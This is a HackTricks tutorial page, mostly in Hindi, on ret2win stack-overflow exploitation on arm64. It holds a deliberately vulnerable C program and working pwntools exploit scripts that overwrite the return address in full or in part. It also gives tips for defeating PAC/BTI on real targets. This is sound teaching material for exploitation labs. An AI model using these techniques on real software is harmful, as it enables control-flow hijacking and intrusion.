# Ret2win - arm64

{{#include ../../../banners/hacktricks-training.md}}

arm64 का परिचय यहाँ देखें:


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

## Code
```c
#include <stdio.h>
#include <unistd.h>

void win() {
printf("Congratulations!\n");
}

void vulnerable_function() {
char buffer[64];
read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
vulnerable_function();
return 0;
}
```
pie और canary के बिना संकलन करें:
```bash
clang -o ret2win ret2win.c -fno-stack-protector -Wno-format-security -no-pie -mbranch-protection=none
```
- अतिरिक्त फ्लैग `-mbranch-protection=none` AArch64 Branch Protection (PAC/BTI) को डिसेबल कर देता है। यदि आपका toolchain डिफ़ॉल्ट रूप से PAC या BTI सक्षम करता है, तो इससे lab reproducible रहता है। यह जांचने के लिए कि compiled binary PAC/BTI का उपयोग करती है या नहीं आप:
- AArch64 GNU properties के लिए देखें:
- `readelf --notes -W ret2win | grep -E 'AARCH64_FEATURE_1_(BTI|PAC)'`
- `paciasp`/`autiasp` (PAC) या `bti c` landing pads (BTI) के लिए prologues/epilogues जांचें:
- `objdump -d ret2win | head -n 40`

### AArch64 calling convention — त्वरित तथ्य

- लिंक रजिस्टर `x30` (a.k.a. `lr`) है, और functions आमतौर पर `x29`/`x30` को `stp x29, x30, [sp, #-16]!` के साथ सेव करते हैं और उन्हें `ldp x29, x30, [sp], #16; ret` के साथ restore करते हैं।
- इसका मतलब सेव किया गया return address frame base के सापेक्ष `sp+8` पर रहता है। यदि `char buffer[64]` नीचे रखा गया है, तो saved `x30` को ओवरराइट करने की सामान्य दूरी 64 (buffer) + 8 (saved x29) = 72 bytes है — बिल्कुल वही जो नीचे मिलेगा।
- Stack pointer को function boundaries पर 16‑byte aligned रखना आवश्यक है। यदि आप बाद में अधिक complex scenarios के लिए ROP chains बनाते हैं, तो SP alignment बनाए रखें वरना function epilogues पर crash हो सकता है।

## Finding the offset

### Pattern option

This example was created using [**GEF**](https://github.com/bata24/gef):

gdb को gef के साथ शुरू करें, pattern बनाएं और उपयोग करें:
```bash
gdb -q ./ret2win
pattern create 200
run
```
<figure><img src="../../../images/image (1205).png" alt=""><figcaption></figcaption></figure>

arm64 रजिस्टर x30 में मौजूद पते (जिसे समझौता किया गया था) पर लौटने की कोशिश करेगा, हम इसका उपयोग pattern offset खोजने के लिए कर सकते हैं:
```bash
pattern search $x30
```
<figure><img src="../../../images/image (1206).png" alt=""><figcaption></figcaption></figure>

**The offset is 72 (9x48).**

### Stack offset विकल्प

pc register जहाँ स्टोर होता है उस stack address को प्राप्त करके शुरू करें:
```bash
gdb -q ./ret2win
b *vulnerable_function + 0xc
run
info frame
```
<figure><img src="../../../images/image (1207).png" alt=""><figcaption></figcaption></figure>

अब `read()` के बाद एक breakpoint सेट करें और `read()` के चलने तक continue करें तथा 13371337 जैसे pattern सेट करें:
```
b *vulnerable_function+28
c
```
<figure><img src="../../../images/image (1208).png" alt=""><figcaption></figcaption></figure>

पता लगाइए कि यह पैटर्न मेमोरी में कहाँ स्टोर है:

<figure><img src="../../../images/image (1209).png" alt=""><figcaption></figcaption></figure>

फिर: **`0xfffffffff148 - 0xfffffffff100 = 0x48 = 72`**

<figure><img src="../../../images/image (1210).png" alt="" width="339"><figcaption></figcaption></figure>

## No PIE

### सामान्य

**`win`** फ़ंक्शन के पते को प्राप्त करें:
```bash
objdump -d ret2win | grep win
ret2win:     file format elf64-littleaarch64
00000000004006c4 <win>:
```
Exploit:
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)
# Optional but nice for AArch64
context.arch = 'aarch64'

# Prepare the payload
offset = 72
ret2win_addr = p64(0x00000000004006c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../images/image (1211).png" alt="" width="375"><figcaption></figcaption></figure>

### Off-by-1

दरअसल यह stack में स्टोर किए गए PC में असल में off-by-2 जैसा होगा। सारी return address को overwrite करने की बजाय हम **only the last 2 bytes** को `0x06c4` से overwrite करेंगे।
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x06c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../images/image (1212).png" alt="" width="375"><figcaption></figcaption></figure>

आप ARM64 में एक और off-by-one उदाहरण इस लिंक पर पा सकते हैं: [https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/), जो एक काल्पनिक vulnerability में वास्तविक off-by-**one** है।

## PIE के साथ

> [!TIP]
> बाइनरी को **`-no-pie` argument के बिना** कंपाइल करें

### Off-by-2

एक leak के बिना हम win function का सटीक address नहीं जानते लेकिन हम binary से उस function का offset जान सकते हैं और यह जानते हुए कि जिस return address को हम overwrite कर रहे हैं वह पहले से ही एक नज़दीकी address की ओर इशारा कर रहा है, इस केस में win function के offset (**0x7d4**) को leak करना संभव है और बस उस offset का उपयोग करना है:

<figure><img src="../../../images/image (1213).png" alt="" width="563"><figcaption></figcaption></figure>
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x07d4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
### आधुनिक AArch64 हार्डनिंग (PAC/BTI) और ret2win पर नोट्स

- यदि बाइनरी AArch64 Branch Protection के साथ कंपाइल की गई है, तो आप फ़ंक्शन प्रोलॉग्स/एपिलॉग्स में `paciasp`/`autiasp` या `bti c` देख सकते हैं। ऐसे मामलों में:
- यदि आप ऐसे पते पर लौटते हैं जो एक वैध BTI लैंडिंग पैड नहीं है तो `SIGILL` उठ सकता है। प्राथमिकता दें कि आप उसी फ़ंक्शन एंट्री को टारगेट करें जिसमें `bti c` मौजूद हो।
- यदि returns के लिए PAC सक्षम है, तो साधारण return‑address ओवरराइट्स विफल हो सकते हैं क्योंकि एपिलॉग `x30` को ऑथेंटिकेट करता है। सीखने के परिवेश में, पुनर्निर्माण करें with `-mbranch-protection=none` (ऊपर दिखाया गया)। वास्तविक लक्ष्यों पर हमला करते समय, non‑return hijacks (जैसे function pointer ओवरराइट्स) को प्राथमिकता दें या ऐसा ROP बनाएं जो कभी भी आपके नकली LR को ऑथेंटिकेट करने वाला `autiasp`/`ret` जोड़ा न चलाए।
- फीचर्स जल्दी से जाँचने के लिए:
- `readelf --notes -W ./ret2win` और `AARCH64_FEATURE_1_BTI` / `AARCH64_FEATURE_1_PAC` नोट्स की तलाश करें।
- `objdump -d ./ret2win | head -n 40` और `bti c`, `paciasp`, `autiasp` की तलाश करें।

### Running on non‑ARM64 hosts (qemu‑user quick tip)

यदि आप x86_64 पर हैं लेकिन AArch64 का अभ्यास करना चाहते हैं:
```bash
# Install qemu-user and AArch64 libs (Debian/Ubuntu)
sudo apt-get install qemu-user qemu-user-static libc6-arm64-cross

# Run the binary with the AArch64 loader environment
qemu-aarch64 -L /usr/aarch64-linux-gnu ./ret2win

# Debug with GDB (qemu-user gdbstub)
qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./ret2win &
# In another terminal
gdb-multiarch ./ret2win -ex 'target remote :1234'
```
### संबंधित HackTricks पृष्ठ

-
{{#ref}}
../../rop-return-oriented-programing/rop-syscall-execv/ret2syscall-arm64.md
{{#endref}}
-
{{#ref}}
../../rop-return-oriented-programing/ret2lib/ret2lib-+-printf-leak-arm64.md
{{#endref}}



## संदर्भ

- AArch64 पर Linux के लिए PAC और BTI सक्षम करना (Arm Community, Nov 2024). https://community.arm.com/arm-community-blogs/b/operating-systems-blog/posts/enabling-pac-and-bti-on-aarch64-for-linux
- Arm 64-बिट आर्किटेक्चर के लिए Procedure Call Standard (AAPCS64). https://github.com/ARM-software/abi-aa/blob/main/aapcs64/aapcs64.rst
{{#include ../../../banners/hacktricks-training.md}}
